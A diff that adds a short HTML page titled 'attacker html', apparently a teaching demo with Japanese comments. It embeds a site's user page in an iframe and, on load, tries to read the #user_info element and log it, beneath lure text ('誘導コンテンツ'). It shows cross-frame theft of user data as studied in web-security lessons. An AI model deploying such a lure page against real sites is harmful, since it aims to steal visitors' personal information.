@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>attacker html</title>
+    <script>
+      function load() {
+        // ユーザー情報読み取り
+        const userInfo = frm.document.querySelector('#user_info');
+        console.log(userInfo.textContent);
+      }
+    </script>
+  </head>
+  <body>
+    <div>
+      誘導コンテンツ
+    </div>
+    <iframe
+      name="frm"
+      onload="load()"
+      src="http://site.example:3000/user.html"
+      width="80%"
+    />
+  </body>
+</html>
